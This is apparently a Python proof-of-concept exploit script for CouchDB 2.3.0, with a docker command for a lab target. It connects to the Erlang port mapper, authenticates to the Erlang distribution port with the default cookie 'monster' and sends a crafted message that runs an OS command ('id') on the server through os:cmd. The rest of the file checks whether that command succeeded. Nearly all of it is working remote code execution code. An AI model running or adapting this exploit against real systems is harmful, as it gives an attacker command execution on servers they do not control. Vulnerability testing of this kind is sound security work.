#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import re
import sys
import socket
import hashlib
import struct


# Vuln Base Info
def title():
    print('''"vuln-target": docker run --rm -p 5984:5984 -p 4369:4369 -p 9100:9100 \
     -d -e NODENAME=test -e 'ERL_FLAGS=-setcookie "monster"' couchdb:2.3.0''')


# Proof of Concept
def poc():
    result = {}
    target = url
    EPMD_PORT = 4369
    COOKIE = "monster"  # Default Erlang cookie for CouchDB
    ERLNAG_PORT = 0
    EPM_NAME_CMD = b"\x00\x01\x6e"  # Request for nodes list

    # Some data:
    NAME_MSG = b"\x00\x15n\x00\x07\x00\x03\x49\x9cAAAAAA@AAAAAAA"
    CHALLENGE_REPLY = b"\x00\x15r\x01\x02\x03\x04"

    try:
        # Connect to EPMD:
        try:
            epm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            epm_socket.connect((target, EPMD_PORT))
        except:
            return result

        epm_socket.send(EPM_NAME_CMD)  # request Erlang nodes
        if epm_socket.recv(4) == b'\x00\x00\x11\x11':  # OK
            data = epm_socket.recv(1024)
            data = data[0:len(data) - 1].decode('ascii')
            data = data.split("\n")
            if len(data) == 1:
                choise = 1
            else:
                print("\nMore than one node found, choose which one to use:")
                line_number = 0
                for line in data:
                    line_number += 1
                    print(" %d) %s" % (line_number, line))
                choise = int(input("\n> "))

            ERLNAG_PORT = int(re.search(r"\d+$", data[choise - 1])[0])
        else:
            return result
        epm_socket.close()

        # Connect to Erlang port:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, ERLNAG_PORT))
        except:
            return result
        s.send(NAME_MSG)
        s.recv(5)  # Receive "ok" message
        challenge = s.recv(1024)  # Receive "challenge" message
        challenge = struct.unpack(">I", challenge[9:13])[0]

        # Add Challenge Digest
        CHALLENGE_REPLY += hashlib.md5(bytes(COOKIE, "ascii")
                                       + bytes(str(challenge), "ascii")).digest()
        s.send(CHALLENGE_REPLY)
        CHALLENGE_RESPONSE = s.recv(1024)

        if len(CHALLENGE_RESPONSE) == 0:
            print("Authentication failed, exiting")
            return result
        print(compile_cmd("id"))
        s.send(compile_cmd("id"))
        data_size = struct.unpack(">I", s.recv(4))[0]  # Get data size
        s.recv(45)  # Control message
        data_size -= 45
        data = s.recv(1024 if data_size > 1024 else data_size)
        data_text = data.decode()
        print(data_text)
        if "uid=" in data_text and "gid=" in data_text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = "{}:{}".format(target, EPMD_PORT)

    except:
        return result

    return result


def compile_cmd(cmd):
    CTRL_DATA = b"\x83h\x04a\x06gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03"
    CTRL_DATA += b"\x00\x00\x00\x00\x00w\x00w\x03rex"

    MSG = b"\x83h\x02gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00"
    MSG += b"\x00\x00h\x05w\x04callw\x02osw\x03cmdl\x00\x00\x00\x01k"
    MSG += struct.pack(">H", len(cmd))
    MSG += bytes(cmd, 'ascii')
    MSG += b'jw\x04user'
    PAYLOAD = b'\x70' + CTRL_DATA + MSG
    PAYLOAD = struct.pack('!I', len(PAYLOAD)) + PAYLOAD

    return PAYLOAD


if __name__ == '__main__':
    title()
    socket.setdefaulttimeout(3)
    url = sys.argv[1]
    if poc():
        print(url + '\tExist')
    else:
        print(url + '\tUExist')
